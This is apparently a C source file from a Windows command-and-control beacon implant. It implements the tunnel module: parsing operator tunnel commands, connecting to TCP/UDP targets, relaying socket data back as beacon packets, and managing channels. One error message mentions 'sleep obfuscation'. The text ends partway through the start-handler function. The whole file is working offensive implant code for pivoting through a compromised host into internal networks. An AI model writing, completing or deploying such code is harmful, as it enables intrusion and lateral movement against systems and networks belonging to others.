#include "beacon_tunnel.h"

#include "beacon_commands.h"
#include "beacon_context.h"

#include <process.h>

#define TUNNEL_TCP_READ_BUFFER_SIZE (16 * 1024)
#define TUNNEL_UDP_READ_BUFFER_SIZE (32 * 1024)
#define TUNNEL_READ_POLL_MS 500
#define TUNNEL_UDP_IDLE_MS 15000
#define TUNNEL_MAX_IDLE_MS (5 * 60 * 1000)

/*
 * 隧道管理器维护 TCP/UDP 通道、待发送控制包和待发送数据包。
 * start/control/data/close 命令都在这里归一化成 channel 状态变更。
 */

typedef struct TunnelCloseNotice {
    CHAR tunnel_id[128];
    CHAR channel_id[128];
    INT reason;
} TunnelCloseNotice;

/* 返回空数据包列表（无条目） */
static PacketList TunnelEmptyList(VOID)
{
    PacketList out;
    PlistInit(&out);
    return out;
}

/* 返回包含单个文本结果的数据包列表 */
static PacketList TunnelTextResult(const CHAR* text)
{
    PacketList out;
    PlistInit(&out);
    PlistAdd(&out, BbFromText(text ? text : ""));
    return out;
}

/* 原地去除前导和尾部空白字符 */
static VOID TunnelTrimInPlace(CHAR* s)
{
    CHAR* start;
    SIZE_T len;

    if (!s) {
        return;
    }

    /* 跳过前导空白字符 */
    start = s;
    while (*start && isspace((BYTE)*start)) {
        ++start;
    }
    if (start != s) {
        memmove(s, start, strlen(start) + 1);
    }

    /* 去除尾部空白字符 */
    len = strlen(s);
    while (len > 0 && isspace((BYTE)s[len - 1])) {
        s[--len] = 0;
    }
}

/* 原地将字符串转换为小写 */
static VOID TunnelLowerInPlace(CHAR* s)
{
    while (s && *s) {
        *s = (CHAR)tolower((BYTE)*s);
        ++s;
    }
}

/* 释放 TunnelStartRequest 中所有堆分配的字段 */
static VOID TunnelFreeStart(TunnelStartRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->mode);
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    HeapFree(GetProcessHeap(), 0, req->proto);
    HeapFree(GetProcessHeap(), 0, req->target);
    memset(req, 0, sizeof(*req));
}

/* 释放 TunnelControlRequest 中所有堆分配的字段 */
static VOID TunnelFreeControl(TunnelControlRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    HeapFree(GetProcessHeap(), 0, req->action);
    HeapFree(GetProcessHeap(), 0, req->reason);
    memset(req, 0, sizeof(*req));
}

/* 释放 TunnelDataRequest 中所有堆分配的字段 */
static VOID TunnelFreeData(TunnelDataRequest* req)
{
    HeapFree(GetProcessHeap(), 0, req->tunnel_id);
    HeapFree(GetProcessHeap(), 0, req->channel_id);
    BbFree(&req->data);
    memset(req, 0, sizeof(*req));
}

/* 规范化并验证隧道启动请求；填充默认值 */
static INT TunnelNormalizeStart(TunnelStartRequest* req, CHAR* error, SIZE_T error_len)
{
    TunnelTrimInPlace(req->mode);
    TunnelTrimInPlace(req->tunnel_id);
    TunnelTrimInPlace(req->channel_id);
    TunnelTrimInPlace(req->proto);
    TunnelTrimInPlace(req->target);
    TunnelLowerInPlace(req->mode);
    TunnelLowerInPlace(req->proto);

    /* 默认模式 */
    if (!req->mode || req->mode[0] == 0) {
        HeapFree(GetProcessHeap(), 0, req->mode);
        req->mode = HeapStrDupA("port_forward");
    }

    /* 必需字段 */
    if (!req->tunnel_id || req->tunnel_id[0] == 0) {
        snprintf(error, error_len, "tunnel_id is required");
        return 0;
    }
    if (!req->channel_id || req->channel_id[0] == 0) {
        snprintf(error, error_len, "channel_id is required");
        return 0;
    }

    /* 基于模式的默认协议 */
    if (!req->proto || req->proto[0] == 0) {
        HeapFree(GetProcessHeap(), 0, req->proto);
        req->proto = HeapStrDupA(req->mode && strcmp(req->mode, "udp_proxy") == 0 ? "udp" : "tcp");
    }
    if (!req->proto || (strcmp(req->proto, "tcp") != 0 && strcmp(req->proto, "udp") != 0)) {
        snprintf(error, error_len, "unsupported tunnel proto: %s", req->proto ? req->proto : "");
        return 0;
    }

    /* 必需的目标 */
    if (!req->target || req->target[0] == 0) {
        snprintf(error, error_len, "target_address is required");
        return 0;
    }

    /* 默认连接超时 */
    if (req->connect_timeout_ms <= 0) {
        req->connect_timeout_ms = 10000;
    }
    return 1;
}

/* 规范化并验证隧道控制请求 */
static INT TunnelNormalizeControl(TunnelControlRequest* req, CHAR* error, SIZE_T error_len)
{
    TunnelTrimInPlace(req->tunnel_id);
    TunnelTrimInPlace(req->channel_id);
    TunnelTrimInPlace(req->action);
    TunnelTrimInPlace(req->reason);
    TunnelLowerInPlace(req->action);

    if (!req->tunnel_id || req->tunnel_id[0] == 0) {
        snprintf(error, error_len, "tunnel_id is required");
        return 0;
    }
    return 1;
}

/* 从二进制解析器解析隧道启动请求 */
static INT TunnelParseStart(Parser* parser, TunnelStartRequest* req, CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    req->mode = ParserString(parser);
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->proto = ParserString(parser);
    req->target = ParserString(parser);
    req->connect_timeout_ms = (INT)ParserU32(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeStart(req);
        return 0;
    }

    /* 规范化并验证 */
    if (!TunnelNormalizeStart(req, error, error_len)) {
        TunnelFreeStart(req);
        return 0;
    }
    return 1;
}

/* 解析隧道控制请求，可选覆盖操作 */
static INT TunnelParseControl(Parser* parser, TunnelControlRequest* req, const CHAR* action_override,
                                CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->action = ParserString(parser);
    /* reason 是协议保留字段；当前只解析和释放，不参与控制逻辑。 */
    req->reason = ParserString(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeControl(req);
        return 0;
    }

    /* 若提供则应用操作覆盖 */
    if (action_override && action_override[0]) {
        HeapFree(GetProcessHeap(), 0, req->action);
        req->action = HeapStrDupA(action_override);
    }

    /* 规范化并验证 */
    if (!TunnelNormalizeControl(req, error, error_len)) {
        TunnelFreeControl(req);
        return 0;
    }
    return 1;
}

/* 从二进制解析器解析隧道数据请求 */
static INT TunnelParseData(Parser* parser, TunnelDataRequest* req, CHAR* error, SIZE_T error_len)
{
    memset(req, 0, sizeof(*req));
    BbInit(&req->data);
    req->tunnel_id = ParserString(parser);
    req->channel_id = ParserString(parser);
    req->data = ParserBytes(parser);

    /* 检查解析错误 */
    if (parser->error[0]) {
        snprintf(error, error_len, "%s", parser->error);
        TunnelFreeData(req);
        return 0;
    }
    return 1;
}

/* 将隧道启动请求打包为 ByteBuf */
static ByteBuf TunnelPackStart(const TunnelStartRequest* req)
{
    ByteBuf payload;
    BbInit(&payload);
    PacketArrayString(&payload, req->mode);
    PacketArrayString(&payload, req->tunnel_id);
    PacketArrayString(&payload, req->channel_id);
    PacketArrayString(&payload, req->proto);
    PacketArrayString(&payload, req->target);
    PacketArrayI32(&payload, (INT32)req->connect_timeout_ms);
    return payload;
}

/* 将隧道控制消息打包为 ByteBuf */
static ByteBuf TunnelPackControl(const CHAR* tunnel_id, const CHAR* channel_id, const CHAR* action, INT reason)
{
    ByteBuf payload;
    CHAR reason_text[32] = "";
    BbInit(&payload);

    /* 从代码构建原因文本 */
    if (reason != TUNNEL_REASON_NONE) {
        snprintf(reason_text, sizeof(reason_text), "error_%d", reason);
    }
    PacketArrayString(&payload, tunnel_id ? tunnel_id : "");
    PacketArrayString(&payload, channel_id ? channel_id : "");
    PacketArrayString(&payload, action ? action : "");
    PacketArrayString(&payload, reason_text);
    return payload;
}

/* 将隧道数据载荷打包为 ByteBuf */
static ByteBuf TunnelPackData(const CHAR* tunnel_id, const CHAR* channel_id, const BYTE8* data, SIZE_T len)
{
    ByteBuf payload;
    ByteBuf packed;
    BbInit(&payload);
    PacketArrayString(&payload, tunnel_id ? tunnel_id : "");
    PacketArrayString(&payload, channel_id ? channel_id : "");
    packed = PacketPackBytesData(data, len);
    PacketArrayBytes(&payload, packed.data, packed.len);
    BbFree(&packed);
    return payload;
}

/* 持锁时按 tunnel_id + channel_id 查找通道 */
static TunnelChannel* TunnelFindLocked(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id)
{
    TunnelChannel* ch;
    for (ch = tm->channels; ch; ch = ch->next) {
        if (!ch->done &&
            strcmp(ch->tunnel_id, tunnel_id ? tunnel_id : "") == 0 &&
            strcmp(ch->channel_id, channel_id ? channel_id : "") == 0) {
            return ch;
        }
    }
    return NULL;
}

/* 按 job_id 查找通道（需持锁） */
static TunnelChannel* TunnelFindJobLocked(TunnelManager* tm, UINT32 job_id)
{
    TunnelChannel* ch;
    for (ch = tm->channels; ch; ch = ch->next) {
        if (!ch->done && ch->job_id == job_id) {
            return ch;
        }
    }
    return NULL;
}

/* 关闭并断开通道套接字（幂等操作） */
static VOID TunnelCloseChannel(TunnelChannel* ch)
{
    SOCKET s;
    if (!ch) {
        return;
    }
    if (InterlockedCompareExchange(&ch->closed, 1, 0) == 0) {
        s = ch->socket_handle;
        if (s != INVALID_SOCKET) {
            shutdown(s, SD_BOTH);
            closesocket(s);
            ch->socket_handle = INVALID_SOCKET;
        }
    }
}

/* 将数据包推入有界队列，容量满时丢弃最旧的 */
static VOID TunnelPushBounded(TunnelPendingPacket** head, TunnelPendingPacket** tail, SIZE_T* count,
                                SIZE_T limit, ByteBuf packet)
{
    TunnelPendingPacket* node;

    if (packet.len == 0) {
        BbFree(&packet);
        return;
    }

    /* 容量满时丢弃最旧的数据包 */
    while (*count >= limit && *head) {
        TunnelPendingPacket* old = *head;
        *head = old->next;
        if (!*head) {
            *tail = NULL;
        }
        --(*count);
        BbFree(&old->packet);
        HeapFree(GetProcessHeap(), 0, old);
    }

    /* 分配并入队新节点 */
    node = (TunnelPendingPacket*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*node));
    if (!node) {
        BbFree(&packet);
        return;
    }
    node->packet = packet;
    if (*tail) {
        (*tail)->next = node;
    } else {
        *head = node;
    }
    *tail = node;
    ++(*count);
}

/* 将控制数据包推入控制队列（线程安全） */
static VOID TunnelPushControlPacket(TunnelManager* tm, ByteBuf packet)
{
    EnterCriticalSection(&tm->lock);
    if (tm->control_count >= TUNNEL_MAX_CONTROL_PACKETS) {
        BbFree(&packet);
    } else {
        TunnelPushBounded(&tm->control_head, &tm->control_tail, &tm->control_count,
                          TUNNEL_MAX_CONTROL_PACKETS, packet);
    }
    LeaveCriticalSection(&tm->lock);
}

/* 将数据包推入数据队列（线程安全） */
static VOID TunnelPushDataPacket(TunnelManager* tm, ByteBuf packet)
{
    EnterCriticalSection(&tm->lock);
    TunnelPushBounded(&tm->data_head, &tm->data_tail, &tm->data_count,
                        TUNNEL_MAX_DATA_PACKETS, packet);
    LeaveCriticalSection(&tm->lock);
}

/* 构建并入队隧道控制数据包 */
static VOID TunnelSendControlPacket(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id,
                                       const CHAR* action, INT reason)
{
    ByteBuf payload = TunnelPackControl(tunnel_id, channel_id, action, reason);
    ByteBuf final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_CONTROL, &payload);
    BbFree(&payload);
    TunnelPushControlPacket(tm, final_packet);
}

/* 构建并入队隧道启动确认数据包 */
static VOID TunnelSendStartAck(TunnelManager* tm, const TunnelStartRequest* req)
{
    ByteBuf payload = TunnelPackStart(req);
    ByteBuf final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_START, &payload);
    BbFree(&payload);
    TunnelPushControlPacket(tm, final_packet);
}

/* 构建并入队隧道数据包 */
static VOID TunnelSendDataPacket(TunnelManager* tm, const CHAR* tunnel_id, const CHAR* channel_id,
                                    const BYTE8* data, SIZE_T len)
{
    ByteBuf payload = TunnelPackData(tunnel_id, channel_id, data, len);
    ByteBuf final_packet = PacketMakeFinal(0, BEACON_COMMAND_TUNNEL_DATA, &payload);
    BbFree(&payload);
    TunnelPushDataPacket(tm, final_packet);
}

/* 将 Winsock 错误码映射为隧道原因码 */
static INT TunnelWsaReason(INT err)
{
    switch (err) {
    case WSAETIMEDOUT: return TUNNEL_REASON_TIMEOUT;
    case WSAECONNREFUSED: return TUNNEL_REASON_CONNECTION_REFUSED;
    case WSAENETUNREACH:
    case WSAEHOSTUNREACH: return TUNNEL_REASON_NETWORK_UNREACHABLE;
    case WSAECONNRESET: return TUNNEL_REASON_CONNECTION_RESET;
    case WSAECONNABORTED: return TUNNEL_REASON_CONNECTION_ABORTED;
#ifdef WSAEPIPE
    case WSAEPIPE: return TUNNEL_REASON_BROKEN_PIPE;
#endif
    case WSAHOST_NOT_FOUND:
    case WSANO_DATA:
    case WSANO_RECOVERY:
    case WSATRY_AGAIN: return TUNNEL_REASON_DNS_FAILED;
    default: return TUNNEL_REASON_UNKNOWN;
    }
}

/* 将目标字符串拆分为主机和服务（端口）组件 */
static INT TunnelSplitTarget(const CHAR* target, CHAR* host, SIZE_T host_len, CHAR* service, SIZE_T service_len)
{
    const CHAR* colon;
    SIZE_T len;

    if (!target || !target[0]) {
        return 0;
    }

    /* 处理 IPv6 方括号表示法 [host]:port */
    if (target[0] == '[') {
        const CHAR* end = strchr(target, ']');
        if (!end || end[1] != ':') {
            return 0;
        }
        len = (SIZE_T)(end - target - 1);
        if (len + 1 > host_len) {
            return 0;
        }
        memcpy(host, target + 1, len);
        host[len] = 0;
        strcpy_s(service, service_len, end + 2);
        return service[0] != 0;
    }

    /* 处理 host:port 表示法 */
    colon = strrchr(target, ':');
    if (!colon || colon == target || colon[1] == 0) {
        return 0;
    }
    len = (SIZE_T)(colon - target);
    if (len + 1 > host_len) {
        return 0;
    }
    memcpy(host, target, len);
    host[len] = 0;
    strcpy_s(service, service_len, colon + 1);
    return 1;
}

/* 使用非阻塞套接字和 select() 进行带超时的连接 */
static INT TunnelConnectWithTimeout(SOCKET s, const struct sockaddr* addr, INT addr_len, INT timeout_ms)
{
    u_long nonblock = 1;
    u_long blocking = 0;
    INT ret;
    fd_set write_set;
    fd_set except_set;
    TIMEVAL tv;
    INT so_error = 0;
    INT so_len = sizeof(so_error);

    /* 开始非阻塞连接 */
    ioctlsocket(s, FIONBIO, &nonblock);
    ret = connect(s, addr, addr_len);
    if (ret == 0) {
        ioctlsocket(s, FIONBIO, &blocking);
        return 0;
    }

    /* 检查预期的进行中错误 */
    ret = WSAGetLastError();
    if (ret != WSAEWOULDBLOCK && ret != WSAEINPROGRESS && ret != WSAEINVAL) {
        return ret;
    }

    /* 等待连接完成或超时 */
    FD_ZERO(&write_set);
    FD_ZERO(&except_set);
    FD_SET(s, &write_set);
    FD_SET(s, &except_set);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    ret = select(0, NULL, &write_set, &except_set, &tv);
    if (ret == 0) {
        return WSAETIMEDOUT;
    }
    if (ret == SOCKET_ERROR) {
        return WSAGetLastError();
    }

    /* select 后检查套接字错误 */
    if (getsockopt(s, SOL_SOCKET, SO_ERROR, (CHAR*)&so_error, &so_len) == SOCKET_ERROR) {
        return WSAGetLastError();
    }
    if (so_error != 0) {
        return so_error;
    }

    /* 恢复阻塞模式 */
    ioctlsocket(s, FIONBIO, &blocking);
    return 0;
}

/* 解析并连接到目标地址，返回已连接的套接字 */
static SOCKET TunnelDialTarget(const TunnelStartRequest* req, INT* reason)
{
    CHAR host[256];
    CHAR service[32];
    ADDRINFOA hints;
    ADDRINFOA* result = NULL;
    ADDRINFOA* ai;
    INT gai;
    SOCKET connected = INVALID_SOCKET;
    INT last_error = WSAECONNREFUSED;

    *reason = TUNNEL_REASON_UNKNOWN;

    /* 将目标解析为主机和服务 */
    if (!TunnelSplitTarget(req->target, host, sizeof(host), service, sizeof(service))) {
        *reason = TUNNEL_REASON_DNS_FAILED;
        return INVALID_SOCKET;
    }

    /* 设置 DNS 解析的地址提示 */
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = strcmp(req->proto, "udp") == 0 ? SOCK_DGRAM : SOCK_STREAM;
    hints.ai_protocol = strcmp(req->proto, "udp") == 0 ? IPPROTO_UDP : IPPROTO_TCP;

    gai = getaddrinfo(host, service, &hints, &result);
    if (gai != 0) {
        *reason = TUNNEL_REASON_DNS_FAILED;
        return INVALID_SOCKET;
    }

    /* 尝试每个解析的地址 */
    for (ai = result; ai; ai = ai->ai_next) {
        SOCKET s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == INVALID_SOCKET) {
            last_error = WSAGetLastError();
            continue;
        }
        if (strcmp(req->proto, "udp") == 0) {
            /* UDP：简单阻塞连接 */
            if (connect(s, ai->ai_addr, (INT)ai->ai_addrlen) == 0) {
                connected = s;
                break;
            }
            last_error = WSAGetLastError();
        } else {
            /* TCP：带超时的连接 */
            last_error = TunnelConnectWithTimeout(s, ai->ai_addr, (INT)ai->ai_addrlen, req->connect_timeout_ms);
            if (last_error == 0) {
                connected = s;
                break;
            }
        }
        closesocket(s);
    }
    freeaddrinfo(result);

    if (connected == INVALID_SOCKET) {
        *reason = TunnelWsaReason(last_error);
    } else {
        *reason = TUNNEL_REASON_NONE;
    }
    return connected;
}

/* 向管理器添加通道（线程安全）。返回原因码 */
static INT TunnelManagerAdd(TunnelManager* tm, TunnelChannel* ch)
{
    INT result = TUNNEL_REASON_NONE;
    EnterCriticalSection(&tm->lock);

    /* 检查容量和重复 */
    if (tm->channel_count >= TUNNEL_MAX_CHANNELS) {
        result = TUNNEL_REASON_QUEUE_FULL;
    } else if (TunnelFindLocked(tm, ch->tunnel_id, ch->channel_id)) {
        result = TUNNEL_REASON_DUPLICATE_CHANNEL;
    } else {
        ch->next = tm->channels;
        tm->channels = ch;
        ++tm->channel_count;
    }
    LeaveCriticalSection(&tm->lock);
    return result;
}

/* 工作线程：从通道套接字读取数据并作为数据包发送 */
static UINT __stdcall TunnelWorker(VOID* param)
{
    TunnelChannel* ch = (TunnelChannel*)param;
    BYTE8* buffer;
    INT buf_size = strcmp(ch->proto, "udp") == 0 ? TUNNEL_UDP_READ_BUFFER_SIZE : TUNNEL_TCP_READ_BUFFER_SIZE;

    /* 分配读取缓冲区 */
    buffer = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)buf_size);
    if (!buffer) {
        TunnelSendControlPacket(ch->owner, ch->tunnel_id, ch->channel_id, "close", TUNNEL_REASON_UNKNOWN);
        TunnelCloseChannel(ch);
        InterlockedExchange(&ch->done, 1);
        return 0;
    }

    /* 主读取循环 */
    while (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
        fd_set read_set;
        TIMEVAL tv;
        INT sel;
        INT n;

        /* 暂停时跳过读取 */
        if (InterlockedCompareExchange(&ch->paused, 0, 0)) {
            Sleep(100);
            continue;
        }

        /* 轮询套接字可读性 */
        FD_ZERO(&read_set);
        FD_SET(ch->socket_handle, &read_set);
        tv.tv_sec = 0;
        tv.tv_usec = TUNNEL_READ_POLL_MS * 1000;
        sel = select(0, &read_set, NULL, NULL, &tv);
        if (sel == 0) {
            /* 超时：检查 UDP 空闲限制 */
            if (strcmp(ch->proto, "udp") == 0 && GetTickCount64() - ch->last_seen > TUNNEL_UDP_IDLE_MS) {
                TunnelSendControlPacket(ch->owner, ch->tunnel_id, ch->channel_id, "close", TUNNEL_REASON_TIMEOUT);
                break;
            }
            continue;
        }
        if (sel == SOCKET_ERROR) {
            if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
                TunnelSendControlPacket(ch->owner, ch->tunnel_id, ch->channel_id, "close",
                                           TunnelWsaReason(WSAGetLastError()));
            }
            break;
        }

        /* 从套接字读取数据 */
        n = recv(ch->socket_handle, (CHAR*)buffer, buf_size, 0);
        if (n > 0) {
            ch->bytes_out += (UINT64)n;
            ch->last_seen = GetTickCount64();
            TunnelSendDataPacket(ch->owner, ch->tunnel_id, ch->channel_id, buffer, (SIZE_T)n);
            /* UDP 当前按单次请求/响应语义处理，收到一次响应后关闭通道。 */
            if (strcmp(ch->proto, "udp") == 0) {
                break;
            }
            continue;
        }
        if (n == 0) {
            /* 对端正常关闭 */
            if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
                TunnelSendControlPacket(ch->owner, ch->tunnel_id, ch->channel_id, "close",
                                           TUNNEL_REASON_PEER_CLOSED);
            }
            break;
        }
        /* 读取错误 */
        if (!InterlockedCompareExchange(&ch->closed, 0, 0)) {
            TunnelSendControlPacket(ch->owner, ch->tunnel_id, ch->channel_id, "close",
                                       TunnelWsaReason(WSAGetLastError()));
        }
        break;
    }

    /* 清理 */
    HeapFree(GetProcessHeap(), 0, buffer);
    TunnelCloseChannel(ch);
    InterlockedExchange(&ch->done, 1);
    return 0;
}

/* 移除并释放已完成工作线程的通道 */
static VOID TunnelCleanupDone(TunnelManager* tm)
{
    TunnelChannel** pp;
    EnterCriticalSection(&tm->lock);
    pp = &tm->channels;
    while (*pp) {
        TunnelChannel* ch = *pp;
        if (InterlockedCompareExchange(&ch->done, 0, 0)) {
            *pp = ch->next;
            --tm->channel_count;
            if (ch->thread_handle) {
                CloseHandle(ch->thread_handle);
            }
            if (tm->ctx) RuntimeActivityEnd(tm->ctx);
            SecureZeroMemory(ch, sizeof(*ch));
            HeapFree(GetProcessHeap(), 0, ch);
            continue;
        }
        pp = &(*pp)->next;
    }
    LeaveCriticalSection(&tm->lock);
}

/* 关闭超过最大空闲时间的通道 */
static VOID TunnelCleanupExpired(TunnelManager* tm)
{
    TunnelCloseNotice notices[TUNNEL_MAX_CHANNELS];
    SIZE_T notice_count = 0;
    ULONGLONG now = GetTickCount64();
    TunnelChannel* ch;

    /* 持锁查找过期通道 */
    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch && notice_count < TUNNEL_MAX_CHANNELS; ch = ch->next) {
        if (!ch->done && !ch->closed && now - ch->last_seen > TUNNEL_MAX_IDLE_MS) {
            strcpy_s(notices[notice_count].tunnel_id, sizeof(notices[notice_count].tunnel_id), ch->tunnel_id);
            strcpy_s(notices[notice_count].channel_id, sizeof(notices[notice_count].channel_id), ch->channel_id);
            notices[notice_count].reason = TUNNEL_REASON_TIMEOUT;
            ++notice_count;
            TunnelCloseChannel(ch);
        }
    }
    LeaveCriticalSection(&tm->lock);

    /* 在锁外发送关闭通知 */
    for (SIZE_T i = 0; i < notice_count; ++i) {
        TunnelSendControlPacket(tm, notices[i].tunnel_id, notices[i].channel_id, "close", notices[i].reason);
    }
}

/* 在套接字上发送所有数据，根据需要重试。成功返回 1 */
static INT TunnelSendAll(SOCKET s, const BYTE8* data, SIZE_T len)
{
    SIZE_T sent_total = 0;
    while (sent_total < len) {
        INT chunk = (INT)((len - sent_total) > 32768 ? 32768 : (len - sent_total));
        INT n = send(s, (const CHAR*)data + sent_total, chunk, 0);
        if (n == SOCKET_ERROR || n == 0) {
            return 0;
        }
        sent_total += (SIZE_T)n;
    }
    return 1;
}

/* 使用空状态初始化隧道管理器 */
/* 初始化隧道管理器 */
VOID TunnelInit(TunnelManager* tm, BeaconContext* ctx)
{
    ZeroMemory(tm, sizeof(*tm));
    tm->ctx = ctx;
    InitializeCriticalSection(&tm->lock);
}

/* 关闭所有通道，等待线程，并释放所有资源 */
/* 释放隧道管理器及所有通道 */
VOID TunnelFree(TunnelManager* tm)
{
    TunnelChannel* ch;
    TunnelPendingPacket* node;

    /* 关闭所有通道套接字 */
    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch; ch = ch->next) {
        TunnelCloseChannel(ch);
    }
    LeaveCriticalSection(&tm->lock);

    /* 等待所有工作线程完成 */
    for (;;) {
        INT remaining = 0;
        EnterCriticalSection(&tm->lock);
        for (ch = tm->channels; ch; ch = ch->next) {
            if (ch->thread_handle) {
                ++remaining;
                LeaveCriticalSection(&tm->lock);
                WaitForSingleObject(ch->thread_handle, INFINITE);
                EnterCriticalSection(&tm->lock);
                break;
            }
        }
        LeaveCriticalSection(&tm->lock);
        TunnelCleanupDone(tm);
        if (remaining == 0) {
            break;
        }
    }

    /* 释放剩余的通道结构体 */
    while (tm->channels) {
        ch = tm->channels;
        tm->channels = ch->next;
        if (ch->thread_handle) {
            CloseHandle(ch->thread_handle);
        }
        if (tm->ctx) RuntimeActivityEnd(tm->ctx);
        SecureZeroMemory(ch, sizeof(*ch));
        HeapFree(GetProcessHeap(), 0, ch);
    }

    /* 释放控制数据包队列 */
    node = tm->control_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        BbFree(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }

    /* 释放数据包队列 */
    node = tm->data_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        BbFree(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }

    DeleteCriticalSection(&tm->lock);
    ZeroMemory(tm, sizeof(*tm));
}

/* 按 job_id 取消隧道通道任务 */
BOOL TunnelCancelJob(BeaconContext* ctx, UINT32 job_id, ByteBuf* out)
{
    TunnelManager* tm;
    TunnelChannel* ch;
    CHAR tunnel_id[128] = { 0 };
    CHAR channel_id[128] = { 0 };
    BOOL found = FALSE;

    if (!ctx || !out) return FALSE;
    tm = &ctx->tunnels;

    EnterCriticalSection(&tm->lock);
    ch = TunnelFindJobLocked(tm, job_id);
    if (ch) {
        strcpy_s(tunnel_id, sizeof(tunnel_id), ch->tunnel_id);
        strcpy_s(channel_id, sizeof(channel_id), ch->channel_id);
        InterlockedExchange(&ch->canceled_by_job, 1);
        TunnelCloseChannel(ch);
        found = TRUE;
    }
    LeaveCriticalSection(&tm->lock);

    if (found) {
        TunnelSendControlPacket(tm, tunnel_id, channel_id, "close", TUNNEL_REASON_CANCELED);
        BbPrintf(out, "tunnel job %lu canceled", (unsigned long)job_id);
    }
    return found;
}

/* 轮询隧道管理器：清理过期/已完成的通道，返回待处理数据包 */
PacketList TunnelPoll(TunnelManager* tm)
{
    PacketList out;
    TunnelPendingPacket* node;

    TunnelCleanupExpired(tm);
    TunnelCleanupDone(tm);

    PlistInit(&out);
    out.items_are_final = 1;

    /* 排空控制数据包队列 */
    EnterCriticalSection(&tm->lock);
    node = tm->control_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        PlistAdd(&out, node->packet);
        BbInit(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }
    tm->control_head = NULL;
    tm->control_tail = NULL;
    tm->control_count = 0;

    /* 排空数据数据包队列 */
    node = tm->data_head;
    while (node) {
        TunnelPendingPacket* next = node->next;
        PlistAdd(&out, node->packet);
        BbInit(&node->packet);
        HeapFree(GetProcessHeap(), 0, node);
        node = next;
    }
    tm->data_head = NULL;
    tm->data_tail = NULL;
    tm->data_count = 0;
    LeaveCriticalSection(&tm->lock);
    return out;
}

/* 将所有活动隧道通道追加到作业列表输出 */
VOID TunnelAppendJobs(TunnelManager* tm, ByteBuf* out, SIZE_T* count, ULONGLONG now)
{
    TunnelChannel* ch;
    (VOID)now;

    if (!tm || !out || !count) return;

    EnterCriticalSection(&tm->lock);
    for (ch = tm->channels; ch; ch = ch->next) {
        CHAR ref[260];
        CHAR detail[560];
        ULONGLONG age = ch->created_at ? (GetTickCount64() - ch->created_at) / 1000 : 0;
        const CHAR* state = (InterlockedCompareExchange(&ch->closed, 0, 0) ||
                             InterlockedCompareExchange(&ch->canceled_by_job, 0, 0)) ?
                             "stopping" : "running";

        if (InterlockedCompareExchange(&ch->done, 0, 0)) {
            continue;
        }
        snprintf(ref, sizeof(ref), "%s/%s", ch->tunnel_id, ch->channel_id);
        snprintf(detail, sizeof(detail), "%s %s", ch->proto, ch->target);
        BbPrintf(out, "%-10lu  %-10s  %-10s  %-9I64u  %-9lu  %-10s  %-18s  %s\n",
                 (unsigned long)ch->job_id,
                 "tunnel",
                 state,
                 (unsigned __int64)age,
                 (unsigned long)BEACON_COMMAND_TUNNEL_START,
                 "tunnel",
                 ref[0] ? ref : "-",
                 detail[0] ? detail : "-");
        ++(*count);
    }
    LeaveCriticalSection(&tm->lock);
}

/* 处理隧道启动请求：解析、连接、创建工作线程 */
PacketList TunnelHandleStart(BeaconContext* ctx, UINT32 task_id, Parser* parser)
{
    TunnelManager* tm = &ctx->tunnels;
    TunnelStartRequest req;
    TunnelChannel* ch;
    SOCKET s;
    INT reason;
    CHAR error[160];
    uintptr_t thread_id;

    /* 解析并验证请求 */
    if (!TunnelParseStart(parser, &req, error, sizeof(error))) {
        return TunnelTextResult(error);
    }

    if (!RuntimeActivityBegin(ctx)) {
        TunnelFreeStart(&req);
        return TunnelTextResult("tunnel blocked while sleep obfuscation is active");
    }

    /* 连接到目标 */
    s = TunnelDialTarget(&req, &reason);
    if (s == INVALID_SOCKET) {
        RuntimeActivityEnd(ctx);
        TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, "close", reason);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 分配通道结构体 */
    ch = (TunnelChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*ch));
    if (!ch) {
        RuntimeActivityEnd(ctx);
        closesocket(s);
        TunnelSendControlPacket(tm, req.tunnel_id, req.channel_id, "close", TUNNEL_REASON_UNKNOWN);
        TunnelFreeStart(&req);
        return TunnelEmptyList();
    }

    /* 从请求填充通道信息 */
    ch->job_id = task_id;
    strcpy_s(ch->tunnel_id, sizeof(ch->tunnel_id), req.tunnel_id);
    strcpy_s(ch->channel_id, sizeof(ch->channel_id), req.channel_id);
    strcpy_s(ch->mode, sizeof(ch->mode), req.mode);
